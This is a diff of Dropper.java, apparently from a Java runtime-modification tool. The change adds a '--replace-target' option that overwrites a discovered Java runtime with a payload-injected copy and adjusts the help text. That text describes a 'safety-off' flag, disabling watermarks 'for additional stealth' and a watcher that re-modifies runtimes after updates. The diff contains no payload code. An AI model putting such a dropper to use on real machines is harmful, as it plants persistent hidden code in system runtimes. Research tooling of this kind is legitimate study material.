@@ -72,60 +72,66 @@ public class Dropper {
 	
 	private static final String SAFETY_OFF_LONG_ARGUMENT = "--safety-off";
 	private static final String SAFETY_OFF_SHORT_ARGUMENT = "-so";
-	private static final String SAFETY_OFF_DESCRIPTION = "        This flag must be specified to execute the modifications specified by embedded payloads (enabling the flag disables the built-in safety).";
+	private static final String SAFETY_OFF_DESCRIPTION = "            This flag must be specified to execute the modifications specified by embedded payloads (enabling the flag disables the built-in safety).";
 	private static boolean safetyOff = false;
 	
 	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
 	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
-	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes, if not specified output files will be written as temporary files.";
+	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "       Specifies the output directory to save modified runtimes, if not specified output files will be written as temporary files.";
 	private static File outputDirectory = null;
+	
+	private static final String REPLACE_TARGET_LONG_ARGUMENT = "--replace-target";
+	private static final String REPLACE_TARGET_SHORT_ARGUMENT = "-r";
+	private static final String REPLACE_TARGET_DESCRIPTION = "         Attempt to replace target with modified target.";
+	private static boolean replaceTarget = false;
 
 	private static final String PRINT_TARGETS_LONG_ARGUMENT = "--print-targets";
 	private static final String PRINT_TARGETS_SHORT_ARGUMENT = "-pt";
-	private static final String PRINT_TARGETS_DESCRIPTION = "     Prints the targets of the dropper and exits.";
+	private static final String PRINT_TARGETS_DESCRIPTION = "         Prints the targets of the dropper and exits.";
 	private static boolean printTargets = false;
 	
 	private static final String PRINT_PAYLOADS_LONG_ARGUMENT = "--print-payloads";
 	private static final String PRINT_PAYLOADS_SHORT_ARGUMENT = "-pp";
-	private static final String PRINT_PAYLOADS_DESCRIPTION = "    Prints the payloads of the dropper and exits.";
+	private static final String PRINT_PAYLOADS_DESCRIPTION = "        Prints the payloads of the dropper and exits.";
 	private static boolean printPayloads = false;
 	
 	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
 	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
-	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to search for runtimes, if not specified a default set of search directories will be used.";
+	private static final String SEARCH_DIRECTORIES_DESCRIPTION = "     Specifies a comma separated list of directory paths to search for runtimes, if not specified a default set of search directories will be used.";
 
 	private static boolean watermark = true;
 	private static final String DISABLE_WATERMARK_LONG_ARGUMENT = "--disable-watermarking";
 	private static final String DISABLE_WATERMARK_SHORT_ARGUMENT = "-dw";
-	private static final String DISABLE_WATERMARK_DESCRIPTION = " Disables watermarking the modified target (can be used for additional stealth, but could also cause problems for watchers). Watermarks are used to prevent remodifying a target.";
+	private static final String DISABLE_WATERMARK_DESCRIPTION = "  Disables watermarking the modified target (can be used for additional stealth, but could also cause problems for watchers). Watermarks are used to prevent remodifying a target.";
 	
 	private static boolean ignoreWatermarks = false;
 	private static final String IGNORE_WATERMARK_LONG_ARGUMENT = "--ignore-watermarks";
 	private static final String IGNORE_WATERMARK_SHORT_ARGUMENT = "-iw";
-	private static final String IGNORE_WATERMARK_DESCRIPTION = " Ignores watermarks and modifies targets regardless of whether or not they have been previously modified.";
+	private static final String IGNORE_WATERMARK_DESCRIPTION = "     Ignores watermarks and modifies targets regardless of whether or not they have been previously modified.";
 	
 	private static final String WATCHER_SLEEP_TIME_LONG_ARGUMENT = "--watcher-sleep";
 	private static final String WATCHER_SLEEP_TIME_SHORT_ARGUMENT = "-ws";
-	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "     The amount of time in milliseconds to sleep between watcher checks.";
+	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "         The amount of time in milliseconds to sleep between watcher checks.";
 	private static long watcherSleepTime = (long) (1000 * 60); // 1 minute
 	
 	private static boolean watcher = false;
 	private static final String WATCHER_LONG_ARGUMENT = "--watcher";
 	private static final String WATCHER_SHORT_ARGUMENT = "-w";
-	private static final String WATCHER_DESCRIPTION = "            Enables a watcher process that waits to modify any discovered runtimes until the file hash of the runtime has changed (by default the process sleeps for 1 minute, unless the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified.";
+	private static final String WATCHER_DESCRIPTION = "                Enables a watcher process that waits to modify any discovered runtimes until the file hash of the runtime has changed (by default the process sleeps for 1 minute, unless the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified.";
 	
 	private static final String DEBUG_LONG_ARGUMENT = "--debug";
 	private static final String DEBUG_SHORT_ARGUMENT = "-d";
-	private static final String DEBUG_DESCRIPTION = "              Prints debug information.";
+	private static final String DEBUG_DESCRIPTION = "                  Prints debug information.";
 	private static boolean debug = false;
 	
 	private static final String HELP_LONG_ARGUMENT = "--help";
 	private static final String HELP_SHORT_ARGUMENT = "-h";
 	private static final String HELP_DESCRIPTION = "Usage: java -jar dropper.jar [options]\n" 
-													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "               Prints this menu and exits.\n"
+													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "                   Prints this menu and exits.\n"
 													+ SAFETY_OFF_LONG_ARGUMENT + ", " + SAFETY_OFF_SHORT_ARGUMENT + SAFETY_OFF_DESCRIPTION + "\n"
 													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
 													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
+													+ REPLACE_TARGET_LONG_ARGUMENT + ", " + REPLACE_TARGET_SHORT_ARGUMENT + REPLACE_TARGET_DESCRIPTION + "\n"
 													+ DISABLE_WATERMARK_LONG_ARGUMENT + ", " + DISABLE_WATERMARK_SHORT_ARGUMENT + DISABLE_WATERMARK_DESCRIPTION + "\n"
 													+ IGNORE_WATERMARK_LONG_ARGUMENT + ", " + IGNORE_WATERMARK_SHORT_ARGUMENT + IGNORE_WATERMARK_DESCRIPTION + "\n"
 													+ WATCHER_LONG_ARGUMENT + ", " + WATCHER_SHORT_ARGUMENT + WATCHER_DESCRIPTION + "\n"
@@ -133,7 +139,7 @@ public class Dropper {
 													+ PRINT_TARGETS_LONG_ARGUMENT + ", " + PRINT_TARGETS_SHORT_ARGUMENT + PRINT_TARGETS_DESCRIPTION + "\n"
 													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
 													+ DEBUG_LONG_ARGUMENT + ", " + DEBUG_SHORT_ARGUMENT + DEBUG_DESCRIPTION + "\n"
-													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "            Prints the version of the dropper and exists.";
+													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "                Prints the version of the dropper and exists.";
 	
 	public static void main(String[] args){
 		
@@ -162,6 +168,10 @@ public class Dropper {
 							+ "+ ] requires a valid output directory.");
 					System.exit(1);
 				}
+			}
+			
+			else if(args[i].equals(REPLACE_TARGET_LONG_ARGUMENT) || args[i].equals(REPLACE_TARGET_SHORT_ARGUMENT)){
+				replaceTarget = true;
 			}
 			
 			else if(args[i].equals(PRINT_TARGETS_LONG_ARGUMENT) || args[i].equals(PRINT_TARGETS_SHORT_ARGUMENT)){
@@ -304,7 +314,7 @@ public class Dropper {
 						// skipping runtime
 					}
 				} else {
-					modifyRuntime(configuration, payloads, target, watermark);
+					modifyTarget(configuration, payloads, target, watermark, replaceTarget);
 				}
 			}
 		}
@@ -339,13 +349,13 @@ public class Dropper {
 								}
 
 								searching = false;
-								modifyRuntime(configuration, payloads, target, watermark);
+								modifyTarget(configuration, payloads, target, watermark, replaceTarget);
 							}
 						} catch (Exception e) {
 							// skipping runtime
 						}
 					}
-				} catch (InterruptedException e1) {
+				} catch (InterruptedException ie) {
 					// couldn't sleep, try again
 				}
 			}
@@ -354,10 +364,13 @@ public class Dropper {
 		if(debug) System.out.println("Finished.");
 	}
 
-	private static void modifyRuntime(Configuration configuration, byte[][] payloads, File runtime, boolean watermark) {
+	private static void modifyTarget(Configuration configuration, byte[][] payloads, File runtime, boolean watermark, boolean replaceTarget) {
 		try {
 			File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
-			modifyRuntime(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, watermark, payloads);
+			if(replaceTarget){
+				outputRuntime = runtime;
+			}
+			modifyTarget(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, watermark, payloads);
 			System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
 		} catch (Exception e) {
 			if(debug) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
@@ -451,7 +464,7 @@ public class Dropper {
 	
 	// TODO: Consider accepting and writing to an output stream instead of a File so that we could generically write to a file, memory, stdout, etc.
 	// TODO: need to consider alternate class loaders
-	private static void modifyRuntime(File originalRuntime, String mergeRenamePrefix, File outputRuntime, boolean watermark, byte[]... classFiles) throws JarException, IOException {
+	private static void modifyTarget(File originalRuntime, String mergeRenamePrefix, File outputRuntime, boolean watermark, byte[]... classFiles) throws JarException, IOException {
 		Engine engine = new Engine(originalRuntime, mergeRenamePrefix);
 		for(byte[] classFile : classFiles){
 			engine.process(classFile);
